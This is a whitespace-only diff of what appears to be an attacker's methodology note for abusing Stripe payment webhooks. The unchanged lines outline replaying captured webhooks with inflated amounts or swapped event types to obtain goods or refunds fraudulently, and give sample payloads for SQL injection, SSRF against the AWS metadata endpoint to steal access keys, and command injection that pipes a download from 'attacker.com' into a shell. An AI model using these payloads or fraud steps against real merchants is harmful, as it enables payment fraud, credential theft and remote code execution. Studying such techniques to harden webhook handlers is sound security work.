@@ -51,7 +51,7 @@ A. Clock skew
    - Stripe validates timestamp (tolerance: 300 seconds)
    - Replay captured webhook beyond tolerance window
    - If server doesn't validate: bypass
-   
+
 B. Raw body bypass
    - Stripe signature computed over raw request body
    - If server processes body as JSON then validates: race condition
@@ -84,10 +84,10 @@ Vulnerability: Webhook is not idempotent, accepts replay.
 Attack:
 1. Capture legitimate webhook from test purchase
    POST /webhook { "type": "payment_intent.succeeded", "amount": 1000 }
-   
+
 2. Replay with modified amount
    POST /webhook { "type": "payment_intent.succeeded", "amount": 1000000 }
-   
+
 3. If merchant fulfills high-value order:
    - Attacker paid $10 test → got $10,000 product
    - Merchant paid out for $1M webhook → fraud
@@ -106,12 +106,12 @@ A. Amount manipulation
    - Change amount in webhook payload
    - Merchant fulfills order at manipulated price
    - Attack: cheap purchase → webhook says high value
-   
+
 B. Status manipulation
    - Capture webhook for successful payment
    - Replay for failed payment
    - Trigger refund for already-processed order
-   
+
 C. Event type manipulation
    - Capture payment_intent.succeeded webhook
    - Replay as charge.refunded
@@ -124,21 +124,21 @@ C. Event type manipulation
 A. SQL injection in webhook handler
    POST /webhook
    { "id": "evt_123' OR 1=1 --" }
-   
+
    If server reflects this in query:
    → Extract card data, transaction records
 
 B. SSRF via webhook URL
    POST /webhook
    { "url": "http://169.254.169.254/latest/meta-data/" }
-   
+
    If server fetches this URL as part of processing:
    → AWS metadata exfil (access keys, tokens)
 
 C. Command injection in webhook params
    POST /webhook
    { "email": "test@example.com; curl attacker.com/shell|bash" }
-   
+
    If server uses params unsanitized:
    → RCE on merchant server
 ```
